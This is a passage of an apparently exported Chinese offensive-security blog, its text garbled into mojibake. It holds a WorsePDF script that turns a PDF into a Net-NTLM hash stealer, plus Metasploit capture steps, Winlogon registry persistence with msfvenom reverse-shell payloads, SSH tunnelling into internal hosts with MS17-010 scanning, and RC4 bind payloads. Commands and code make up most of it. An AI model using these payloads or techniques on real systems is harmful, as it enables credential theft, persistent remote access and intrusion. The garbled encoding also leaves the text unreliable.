è¿˜åŸå‡ºç”¨æˆ·çš„æ˜æ–‡å¯†ç  æ ¹æ®ç”¨æˆ·çš„æ˜æ–‡å¯†ç å°è¯•è¿›ä¸€æ­¥åˆ©ç”¨ åˆ©ç”¨è¿‡ç¨‹é¦–å…ˆï¼Œåˆ©ç”¨ poc è„šæœ¬æ„é€ æ¶æ„çš„ pdf æ–‡ä»¶ã€‚ 1python WorsePDF.py /Users/anonysec/Desktop/demo.pdf 192.168.199.246 #æ­¤IPä¸ºmsfçš„IP ä¹‹åï¼Œmsf æ‰“å¼€ smb ç›‘å¬ï¼Œè¦ç”¨å®ƒæ¥æ¥æ”¶å‘è¿‡æ¥çš„ ntlm è®¤è¯æ•°æ® (ntlm hash)ã€‚ 1234sudo msfconsole -qmsf5 &gt; use auxiliary/server/capture/smbmsf5 auxiliary(server/capture/smb) &gt; set johnpwfile pdfmsf5 auxiliary(server/capture/smb) &gt; run å½“æ¶æ„çš„PDFæ–‡ä»¶åœ¨ç›®æ ‡ç³»ç»Ÿè¢« Adobe Reader æ‰“å¼€åï¼Œå³å¯çœ‹åˆ° msf çš„ smb ç›‘å¬å™¨æˆåŠŸè·å–åˆ°æ¥è‡ªç›®æ ‡ç³»ç»Ÿçš„Net NTLM Hashã€‚ ç”¨ Wireshark æŸ¥çœ‹ç½‘ç»œä¼ è¾“ä¸­çš„æ•°æ®åŒ…ï¼ŒåŒ…å« Net NTLM Hash ã€‚ æœ€åï¼Œå¯åˆ©ç”¨Hashcatè¿˜åŸç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œè¾¾åˆ°è¿›ä¸€æ­¥æ·±åº¦åˆ©ç”¨çš„ç›®çš„ã€‚ æ³¨æ„äº‹é¡¹ ç›®æ ‡ç”¨æˆ·å¿…é¡»ä½¿ç”¨PDFé˜…è¯»å™¨æ‰“å¼€ï¼Œå¦‚æœä½¿ç”¨IEæˆ–æ˜¯Chromeæ‰“å¼€PDFæ–‡ä»¶ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œ ç›¸å¯¹äºä¼ ç»Ÿçš„é’“é±¼é¡µé¢ï¼Œæ­¤ç±»æ‰‹æ³•æ›´åŠ çš„éšè”½ éœ€è‡ªè¡Œå…‹æœå…æ€é—®é¢˜ é™„ä»£ç 12345678910111213141516171819202122232425262728293031323334353637# WorsePDF# Turn a normal PDF file into malicious.Use to steal Net-NTLM Hashes from windows machines.import sysdef AddPayload(Data,ip): Payload = &#x27;/AA &lt;&lt;/O &lt;&lt;/F (\\\\\\\\\\\\\\\\&#x27; + ip + &#x27;\\\\\\\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt;&#x27; index1 = Data.find(&#x27;/Parent&#x27;) + 13 # print &quot;%x&quot; % index1 Newdata = Data[0:index1] + Payload + Data[index1:] return Newdataif __name__ == &quot;__main__&quot;: print &quot;WorsePDF - Turn a normal PDF file into malicious.Use to steal Net-NTLM Hashes from windows machines.\\n&quot; if len(sys.argv)!=3: print (&#x27;Usage:&#x27;) print (&#x27; WorsePDF.py &lt;normal PDF file Path&gt; &lt;ServerIP&gt;&#x27;) sys.exit(0) print &quot;[*]NormalPDF: %s&quot; % sys.argv[1] print &quot;[*]ServerIP: %s&quot; % sys.argv[2] file_object = open(sys.argv[1],&#x27;rb&#x27;) try: all_the_text = file_object.read( ) finally: file_object.close() Newdata = AddPayload(all_the_text,sys.argv[2]) MaliciousPath = sys.argv[1] + &#x27;.malicious.pdf&#x27; print &quot;[+]MaliciousPDF: %s&quot; % MaliciousPath file_object2 = open(MaliciousPath, &#x27;wb&#x27;) file_object2.write(Newdata) file_object2.close() print &quot;[*]All Done&quot;","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"Windowsæƒé™ç»´æŒä¹‹WinLogon","slug":"Windowsæƒé™ç»´æŒä¹‹WinLogon","date":"2020-01-14T11:42:25.000Z","updated":"2021-07-07T07:16:41.326Z","comments":true,"path":"2020/0114/.html","link":"","permalink":"https://payloads.cn/2020/0114/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹Windows Logon Processï¼ˆå³winlogon.exe)ï¼Œæ˜¯Windowsç”¨æˆ·ç™»é™†ç¨‹åºï¼Œå®ƒå¤„ç†å„ç§æ´»åŠ¨ï¼Œä¾‹å¦‚ç™»å½•ã€æ³¨é”€ã€åœ¨èº«ä»½éªŒè¯æœŸé—´åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ï¼Œå…³é—­ï¼Œé”å®šå±å¹•ç­‰ã€‚ è¿™ç§è¡Œä¸ºç”±æ³¨å†Œè¡¨ç®¡ç†ï¼Œè¯¥æ³¨å†Œè¡¨å®šä¹‰äº†åœ¨Windowsç™»å½•æœŸé—´å¯åŠ¨å“ªäº›è¿›ç¨‹ã€‚ æ³¨å†Œè¡¨é¡¹12HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserinitHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell åˆ©ç”¨è¿‡ç¨‹Userinit1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit é¦–å…ˆï¼Œåˆ©ç”¨msfvenomç”Ÿæˆpayloadã€‚ 1sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.144.174 LPORT=5353 -f exe &gt; logon.exe ç”Ÿæˆçš„payloadéœ€è¦æ”¾å…¥C:\\Windows\\System32\\ä¸­ï¼Œä¿®æ”¹æ³¨å†Œè¡¨é¡¹â€œ Userinit â€ã€‚è¿™æ ·ï¼Œåœ¨Windowsé‡æ–°ç™»å½•æœŸé—´ï¼Œå¯ä»¥åŒæ—¶è¿è¡Œè¿™ä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼šuserinit.exe ä¸ logon.exeã€‚ Metasploitå¯ç”¨ç›‘å¬ï¼Œå½“ç›®æ ‡æ“ä½œç³»ç»Ÿæ³¨é”€ã€é‡å¯ç­‰ï¼ŒSessionå°±ä¼šä¸Šçº¿ã€‚ 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 0.0.0.0msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j Shell1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell åŒæ ·ï¼Œåˆ©ç”¨msfvenomç”Ÿæˆpayloadã€‚ 1sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.144.174 LPORT=5353 -f exe &gt; logon.exe ç”Ÿæˆçš„payloadæ”¾å…¥C:\\Program Files\\Internet Explorer\\ä¸­ï¼Œä¿®æ”¹æ³¨å†Œè¡¨é¡¹â€œ Shell â€ã€‚ç³»ç»Ÿé‡æ–°ç™»å½•æœŸé—´ï¼ŒåŒæ—¶è¿è¡Œè¿™ä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼šexplorer.exe ä¸ logon.exeã€‚ Metasploitå¯ç”¨ç›‘å¬ï¼Œå½“ç›®æ ‡æ“ä½œç³»ç»Ÿæ³¨é”€ã€é‡å¯ç­‰ï¼ŒSessionå°±ä¼šä¸Šçº¿ã€‚ 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 0.0.0.0msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j æ‹“å±•å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­å¯¹æ³¨å†Œè¡¨è¿›è¡Œè®¾ç½®ï¼Œä¿®æ”¹Shellå’ŒUserinitæ³¨å†Œè¡¨é¡¹ã€‚ 12reg add &quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v Shell /d &quot;explorer.exe,logon.exe&quot; /freg add &quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v Userinit /d &quot;Userinit.exe,logon.exe&quot; /f","categories":[{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"SSHåŠ å¯†éš§é“ä¹‹ç«¯å£è½¬å‘","slug":"SSHåŠ å¯†éš§é“ä¹‹ç«¯å£è½¬å‘","date":"2020-01-09T05:35:28.000Z","updated":"2021-07-07T07:18:42.008Z","comments":true,"path":"2020/0109/.html","link":"","permalink":"https://payloads.cn/2020/0109/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹SSHä¼šè‡ªåŠ¨åŠ å¯†å’Œè§£å¯†æ‰€æœ‰SSHå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ç½‘ç»œæ•°æ®ï¼Œè¿˜èƒ½å¤Ÿå°†å…¶ä»–TCPç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡SSHè¿æ¥è¿›è¡Œè½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ï¼Œè¿™ä¸€è¿‡ç¨‹è¢«å«åšâ€œSSHéš§é“â€ (tunneling)ã€‚ SSHéš§é“åŠ å¯†ä¼ è¾“ï¼Œä¸¤å¤§ä¼˜åŠ¿ï¼š åŠ å¯†SSH Client ç«¯è‡³SSH Server ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ® çªç ´é˜²ç«å¢™çš„é™åˆ¶å®Œæˆä¸€äº›ä¹‹å‰æ— æ³•å»ºç«‹çš„TCP è¿æ¥ SSHéš§é“åŠ å¯†ä¼ è¾“ï¼Œ C/S æ¨¡å¼çš„æ¶æ„ï¼Œé…ç½®æ–‡ä»¶åˆ†ä¸ºï¼š æœåŠ¡å™¨ç«¯é…ç½®æ–‡ä»¶ï¼š/etc/ssh/sshd_config å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼š/etc/ssh/ssh_configã€ç”¨æˆ·é…ç½®æ–‡ä»¶~/.ssh/config å‚æ•°è¯¦è§£å…³äºå»ºç«‹sshéš§é“æ—¶æ‰€ç”¨åˆ°ä¸€äº›å‚æ•°çš„è¯¦ç»†è§£é‡Šï¼š 1234567891011-C å‹ç¼©ä¼ è¾“ï¼ŒåŠ å¿«ä¼ è¾“é€Ÿåº¦-f åœ¨åå°å¯¹ç”¨æˆ·åå¯†ç è¿›è¡Œè®¤è¯-N ä»…ä»…åªç”¨æ¥è½¬å‘ï¼Œä¸ç”¨å†å¼¹å›ä¸€ä¸ªæ–°çš„shell -n åå°è¿è¡Œ-q å®‰é™æ¨¡å¼ï¼Œä¸è¦æ˜¾ç¤ºä»»ä½•debugä¿¡æ¯-l æŒ‡å®šsshç™»å½•å-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥åˆ°æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£-L è¿›è¡Œæœ¬åœ°ç«¯å£è½¬å‘-R è¿›è¡Œè¿œç¨‹ç«¯å£è½¬å‘-D åŠ¨æ€è½¬å‘ï¼Œå³socksä»£ç†-T ç¦æ­¢åˆ†é…ä¼ªç»ˆç«¯-p æŒ‡å®šè¿œç¨‹sshæœåŠ¡ç«¯å£ æœ¬åœ°è½¬å‘æŠŠæœ¬åœ°ç«¯å£æ•°æ®è½¬å‘åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œæœ¬åœ°æœåŠ¡å™¨ä½œä¸ºSSHå®¢æˆ·ç«¯åŠåº”ç”¨æˆ·ç«¯ï¼Œç§°ä¸ºæ­£å‘ tcp ç«¯å£åŠ å¯†è½¬å‘ã€‚ åŸºç¡€ç¯å¢ƒæœ¬åœ°æ”»å‡»æœº 10.11.42.99 â˜ï¸VPS 192.168.144.174 â˜ï¸ç›®æ ‡Widnwos WebæœåŠ¡å™¨(å‡ºç½‘) 192.168.144.210 å¿…è¦é…ç½®åˆ°â˜ï¸VPS192.168.144.174æœºå™¨ä¸Šä¿®æ”¹ ssh é…ç½®ï¼š 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart å‚æ•°è¯¦è§£ AllowTcpForwarding æ˜¯å¦å…è®¸TCPè½¬å‘ï¼Œé»˜è®¤å€¼ä¸ºâ€yesâ€ã€‚ GatewayPorts æ˜¯å¦å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°çš„è½¬å‘ç«¯å£ï¼Œé»˜è®¤å€¼æ˜¯â€noâ€ã€‚ GatewayPorts no è¿™å¯ä»¥é˜²æ­¢è¿æ¥åˆ°æœåŠ¡å™¨è®¡ç®—æœºå¤–éƒ¨çš„è½¬å‘ç«¯å£ã€‚ GatewayPorts yes è¿™å…è®¸ä»»ä½•äººè¿æ¥åˆ°è½¬å‘çš„ç«¯å£ã€‚å¦‚æœæœåŠ¡å™¨åœ¨å…¬å…±äº’è”ç½‘ä¸Šï¼Œäº’è”ç½‘ä¸Šçš„ä»»ä½•äººéƒ½å¯ä»¥è¿æ¥åˆ°ç«¯å£ã€‚ GatewayPorts clientspecified è¿™æ„å‘³ç€å®¢æˆ·ç«¯å¯ä»¥æŒ‡å®šä¸€ä¸ªIPåœ°å€ï¼Œè¯¥IPåœ°å€å…è®¸è¿æ¥åˆ°ç«¯å£çš„è¿æ¥ã€‚å…¶å‘½ä»¤æ˜¯ï¼š ssh -R 1.1.1.1:8080:localhost:80 www.example.com åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œåªæœ‰æ¥è‡ªIPåœ°å€ä¸º1.1.1.1ä¸”ç›®æ ‡ç«¯å£æ˜¯8080çš„è¢«å…è®¸ã€‚ TCPKeepAlive æŒ‡å®šç³»ç»Ÿæ˜¯å¦å‘å®¢æˆ·ç«¯å‘é€ TCP keepalive æ¶ˆæ¯ï¼Œé»˜è®¤å€¼æ˜¯â€yesâ€ã€‚è¿™ç§æ¶ˆæ¯å¯ä»¥æ£€æµ‹åˆ°æ­»è¿æ¥ã€è¿æ¥ä¸å½“å…³é—­ã€å®¢æˆ·ç«¯å´©æºƒç­‰å¼‚å¸¸ã€‚ å¯ä»¥ç†è§£æˆä¿æŒå¿ƒè·³ï¼Œé˜²æ­¢ ssh æ–­å¼€ã€‚ å…·ä½“æµç¨‹å…ˆåœ¨æœ¬åœ°æ”»å‡»æœºæ‰§è¡Œsshè½¬å‘ï¼Œä¹‹åç”¨è¿œç¨‹æ¡Œé¢è¿æ¥æœ¬åœ°çš„33389ç«¯å£ï¼Œå®é™…æ˜¯è¿æ¥192.168.144.210çš„è¿œç¨‹æ¡Œé¢ã€‚ ç®€å•è¯´ å°±æ˜¯é€šè¿‡â˜ï¸VPSè¿™å°æœºå™¨æŠŠæœ¬åœ°æ”»å‡»æœºçš„33389ç«¯å£è½¬åˆ°äº†â˜ï¸ç›®æ ‡æœåŠ¡å™¨çš„3389ç«¯å£ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªssh éš§é“æ˜¯å»ºç«‹åœ¨æœ¬åœ°æ”»å‡»æœºä¸â˜ï¸VPSä¹‹é—´çš„ã€‚ 12ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Hostssh -C -f -N -g -L 33389:192.168.144.210:3389 root@192.168.144.174 -p 22 è¿œç¨‹è½¬å‘æŠŠè¿œç¨‹ç«¯å£æ•°æ®è½¬å‘åˆ°æœ¬åœ°æœåŠ¡å™¨ï¼Œæœ¬åœ°æœåŠ¡å™¨ä½œä¸ºSSHå®¢æˆ·ç«¯åŠåº”ç”¨æœåŠ¡ç«¯ï¼Œç§°ä¸ºåå‘tcpç«¯å£åŠ å¯†è½¬å‘ã€‚ åŸºç¡€ç¯å¢ƒâ˜ï¸VPS 10.11.42.99 â˜ï¸ç›®æ ‡Linux WebæœåŠ¡å™¨(å‡ºç½‘) 192.168.144.174 ç›®æ ‡Widnwos WebæœåŠ¡å™¨(ä¸å‡ºç½‘) 192.168.144.210 å¿…è¦é…ç½®ç°å·²è·å–â˜ï¸ç›®æ ‡æœåŠ¡å™¨(å‡ºç½‘)æƒé™ï¼Œåœ¨è¯¥æœºå™¨ä¸Šä¿®æ”¹ ssh é…ç½®ï¼š 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart å…·ä½“æµç¨‹ç»§ç»­åœ¨â˜ï¸ç›®æ ‡æœåŠ¡å™¨(å‡ºç½‘)æ‰§è¡Œsshè½¬å‘ï¼Œé€šè¿‡ â˜ï¸VPSè¿™å°æœºå™¨ï¼ŒæŠŠæ¥è‡ªå¤–éƒ¨çš„33389ç«¯å£æµé‡éƒ½è½¬åˆ°ç›®æ ‡æœåŠ¡å™¨(ä¸å‡ºç½‘)çš„ 3389 ä¸Šã€‚ 12ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Hostssh -C -f -N -g -R 33389:192.168.144.210:3389 anonysec@10.11.42.99 -p 22 å›åˆ° â˜ï¸VPSè¿™å°æœºå™¨ï¼ŒæŸ¥çœ‹33389ç«¯å£æ˜¯å¦å¤„äºç›‘å¬çŠ¶æ€ã€‚å¦‚æœå¤„äºç›‘å¬çŠ¶æ€ï¼Œåˆ™è¯´æ˜sshéš§é“å»ºç«‹æˆåŠŸã€‚ æ³¨æ„ï¼šéš§é“å»ºç«‹æˆåŠŸåï¼Œé»˜è®¤å¹¶éç›‘å¬åœ¨ 0.0.0.0ï¼Œè€Œæ˜¯ç›‘å¬åœ¨ 127.0.0.1ï¼Œå¯ä»¥ç”¨rinetdå†åšä¸€æ¬¡æœ¬åœ°è½¬å‘ã€‚ å…ˆåœ¨â˜ï¸VPSä¸Šè£…å¥½rinetdï¼Œä¹‹ååœ¨rinetdé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä¸€æ¡è½¬å‘è§„åˆ™ã€‚ 123456apt install rinetd -yvim /etc/rinetd.conf0.0.0.0 3389 127.0.0.1 33389 #è½¬å‘è§„åˆ™service rinetd start rinetdæœ¬åœ°è½¬å‘åï¼ŒæŸ¥çœ‹ç«¯å£æ˜¯å¦å¤„äºç›‘å¬çŠ¶æ€ã€‚ 1netstat -an |egrep &quot;3389|33389&quot; è¿œç¨‹è¿æ¥â˜ï¸VPSçš„3389ç«¯å£ï¼ŒæˆåŠŸè¿æ¥è¿›å…¥ç›®æ ‡æœåŠ¡å™¨(ä¸å‡ºç½‘)çš„è¿œç¨‹æ¡Œé¢ä¸­ã€‚ åŠ¨æ€è½¬å‘åŠ¨æ€ç«¯å£è½¬å‘å®é™…ä¸Šæ˜¯å»ºç«‹ä¸€ä¸ªsshæ­£å‘åŠ å¯†çš„socks4/5ä»£ç†é€šé“ï¼Œä»»ä½•æ”¯æŒsocks4/5åè®®çš„ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠ å¯†çš„é€šé“æ¥è¿›è¡Œä»£ç†è®¿é—®ï¼Œç§°ä¸ºæ­£å‘åŠ å¯†socksã€‚ åŸºç¡€ç¯å¢ƒâ˜ï¸VPS 10.11.42.99 â˜ï¸ç›®æ ‡Linux WebæœåŠ¡å™¨(å‡ºç½‘) 192.168.144.174 ç›®æ ‡Widnwos WebæœåŠ¡å™¨(ä¸å‡ºç½‘) 192.168.144.210 ç›®æ ‡Widnwos Web2æœåŠ¡å™¨(ä¸å‡ºç½‘) 192.168.144.155 å¿…è¦é…ç½®ç°å·²è·å–â˜ï¸ç›®æ ‡æœåŠ¡å™¨(å‡ºç½‘)æƒé™ï¼Œåœ¨è¯¥æœºå™¨ä¸Šä¿®æ”¹ ssh é…ç½®ï¼š 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart å…·ä½“æµç¨‹åœ¨â˜ï¸VPSæ‰§è¡Œsshè½¬å‘ï¼Œå¹¶æŸ¥çœ‹10080ç«¯å£æ˜¯å¦å¤„äºç›‘å¬çŠ¶æ€ã€‚ 123ssh -C -f -N -g -D listen_port user@Tunnel_Hostssh -C -f -N -g -D 10080 root@192.168.144.174 -p 22 #ç›‘å¬127.0.0.1ssh -C -f -N -g -D 0.0.0.0:10080 root@192.168.144.174 -p 22 #ç›‘å¬0.0.0.0 å›åˆ°metasploitæœºå™¨ä¸Šï¼ŒæŒ‚ socks ä»£ç†ï¼Œæ‰«æå†…ç½‘æœåŠ¡å™¨MS17_010ã€‚ 123456sudo msfconsole -qmsf5 &gt; setg proxies socks5:10.11.42.99:10080msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.210msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 10msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run åŒé‡åŠ å¯†åˆ©ç”¨â€sshéš§é“+rc4åŒé‡åŠ å¯†â€å»è¿æ¥ç›®æ ‡å†…ç½‘ä¸‹æŒ‡å®šæœºå™¨ä¸Šçš„meterpreterï¼Œè®©payloadå˜çš„æ›´åŠ éš¾ä»¥è¿½è¸ªã€‚ é¦–å…ˆï¼Œç”¨msfvenomç”Ÿæˆbindçš„rc4 payloadï¼Œå¹¶å°†rc4.exeä¼ å…¥åˆ°ç›®æ ‡Web2æœåŠ¡å™¨(ä¸å‡ºç½‘)ä¸­ï¼Œå¹¶æ‰§è¡Œã€‚ 1msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=AnonySec lport=443 -f exe -o rc4.exe å›åˆ°metasploitæœºå™¨ä¸Šï¼ŒæŒ‚ socks ä»£ç†ï¼Œç›´æ¥bindè¿æ¥åˆ°ç›®æ ‡å†…ç½‘ä¸­Web2æœåŠ¡å™¨(ä¸å‡ºç½‘)çš„meterpreterä¸‹ã€‚ 12345678sudo msfconsole -qmsf5 &gt; setg proxies socks5:10.11.42.99:10080msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp_rc4msf5 exploit(multi/handler) &gt; set rc4password AnonySecmsf5 exploit(multi/handler) &gt; set rhost 192.168.144.155msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; run -j æ€»ç»“SSHéš§é“çš„å®æˆ˜åˆ©ç”¨ï¼Œéœ€è¦å…¨æ–¹ä½è€ƒè™‘ï¼Œæœ¬æ–‡åªæ˜¯è®²è¿°äº†SSHç«¯å£è½¬å‘çš„æ€è·¯ï¼Œå®é™…æ›´éœ€è¦å»æ¢ç´¢å¦‚ä½•åº”å¯¹æŸäº›æç«¯çš„ç›®æ ‡å†…ç½‘ç¯å¢ƒï¼","categories":[{"name":"ç«¯å£è½¬å‘","slug":"ç«¯å£è½¬å‘","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"Metasploitçš„payloadsæ¨¡å—è¯¦è§£","slug":"Metasploitçš„payloadsæ¨¡å—è¯¦è§£","date":"2020-01-08T02:54:05.000Z","updated":"2021-07-07T07:16:51.573Z","comments":true,"path":"2020/0108/.html","link":"","permalink":"https://payloads.cn/2020/0108/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹Payloadsæ¨¡å—ï¼Œå«æœ‰æ•ˆè½½è·æˆ–æœ‰æ•ˆè´Ÿè½½ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„shellcodeï¼Œå°±æ˜¯åœ¨æ¼æ´åˆ©ç”¨æˆåŠŸåæ‰€è¦åšçš„äº‹æƒ…ã€‚åœ¨MSFä¸­ä¸ºæˆ‘ä»¬æä¾›äº†å¤§é‡çš„å®ç”¨payloadsã€‚ å½“æ‰§è¡Œ show payloadså‘½ä»¤åï¼Œæ˜¾ç¤º3åˆ—ï¼Œåˆ†åˆ«ä¸ºï¼špayloadåç§°ã€ç­‰çº§ã€æè¿°ã€‚ å‘½åè§„åˆ™å¹³å°/ç±»å‹/è§„åˆ™åç§° å¦‚ windows/meterpreter/reverse_tcp ç±»å‹ç±»å‹ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š shell : å¾—åˆ°ä¸€ä¸ªshell Dllinject ï¼šä¸Šä¼ DLLå¹¶æ³¨å…¥åˆ°è¿›ç¨‹ Patchupï¼šè¡¥ä¸æ¼æ´ Upexec : ä¸Šä¼ å¹¶æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ Meterpreterï¼šé«˜çº§payload Vncinjectï¼šé«˜çº§payload PassiveXï¼šé«˜çº§payload è§„åˆ™åç§° reverse_tcp : åå‘å»ºç«‹tcpè¿æ¥ bind_tcp ï¼šåå‘å»ºç«‹tcpè¿æ¥ shell_find_tag ï¼š åœ¨ä¸€ä¸ªå·²å»ºç«‹çš„é“¾æ¥ä¸Šåˆ›å»ºä¸€ä¸ªshell shell_reverse_tcp : åå‘è¿æ¥åˆ°æ”»å‡»è€…ä¸»æœºå¹¶åˆ›å»ºä¸€ä¸ªshell reverse_http: é€šè¿‡HTTPéš§é“é€šä¿¡å…µåˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†ç»„ add_user : åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·å¹¶æ·»åŠ åˆ°ç®¡ç†ç»„ xxx_ipv6_tcp ï¼š åŸºäºIPv6 xxx_nonx_tcp ï¼šéNo eXecuteæˆ– win 7ï¼ˆNæ˜¯åº”ç”¨åœ¨CPUçš„ä¸€ç§å¯ä»¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„æŠ€æœ¯ï¼‰ xxx_ord_tcp : æœ‰åºpayload xxx_tcp_allports ï¼š åœ¨æ‰€æœ‰å¯èƒ½çš„ç«¯å£ ç­‰çº§ç­‰çº§ä»£è¡¨å¥½ç”¨ç¨‹åº¦ï¼Œä¸€èˆ¬åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªç­‰çº§ï¼š normalï¼šæ­£å¸¸ excellent ï¼šä¼˜ç§€ greatï¼šæå¥½ goodï¼šå¥½ averageï¼šå¹³å‡ï¼Œä¸€èˆ¬ manualï¼šæ‰‹åŠ¨ æè¿°æè¿°æ˜¯å¯¹payloadsæ¨¡å—çš„ç®€ä»‹ è¯¦ç»†ä¿¡æ¯ info æ¨¡å—å ä½¿ç”¨å…ˆexploitæ¨¡å—ï¼Œå†payloadsæ¨¡å— å½“é€‰æ‹©äº†ä¸€ä¸ªexploitæ¨¡å—å¹¶è®¾ç½®å®Œé€‰é¡¹åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨show payloadsæ¥çœ‹ä¸€ä¸‹å½“å‰exploitå¯ä»¥ç”¨å“ªäº›payloadsï¼Ÿè€Œä¸æ˜¯éšæ„é€‰æ‹©ã€‚ é€‰æ‹©å’Œä½¿ç”¨payloadsä¸‹çš„æŸä¸ªæ¨¡å—ï¼Œåˆ—å‡ºpayloadsä¸‹æŸä¸ªæ¨¡å—çš„å…·ä½“è®¾ç½®é€‰é¡¹ï¼ˆåŒ…æ‹¬exploitsä½¿ç”¨å‚æ•°åï¼‰ set payload payload_name show options","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"å¦‚ä½•ä½¿ç”¨msfvenom","slug":"å¦‚ä½•ä½¿ç”¨msfvenom","date":"2020-01-07T02:51:54.000Z","updated":"2021-07-07T07:15:41.553Z","comments":true,"path":"2020/0107/.html","link":"","permalink":"https://payloads.cn/2020/0107/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹Msfvenom åœ¨ 2015 å¹´ 6 æœˆ 8 æ—¥å·²ç»æ›¿ä»£äº† msfpayload ä¸ msfenocde å‘½ä»¤ï¼Œå®ƒæ˜¯è¿™ä¸¤ä¸ªå‘½ä»¤çš„ç»“åˆä½“ã€‚ 